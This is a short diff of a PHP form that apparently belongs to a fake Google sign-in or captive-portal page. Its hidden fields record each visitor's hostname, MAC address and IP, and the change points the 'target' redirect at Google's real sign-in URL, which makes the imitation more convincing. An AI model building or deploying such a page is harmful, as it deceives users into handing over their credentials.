@@ -35,7 +35,7 @@ require_once('helper.php');
 	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-	<input type="hidden" name="target" value="https://store.google.com/">
+	<input type="hidden" name="target" value="https://accounts.google.com/signin">
 	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
 	<p><a href="">More options</a><span class="text-right"><button type="submit">NEXT</button></span></p>
 </form>
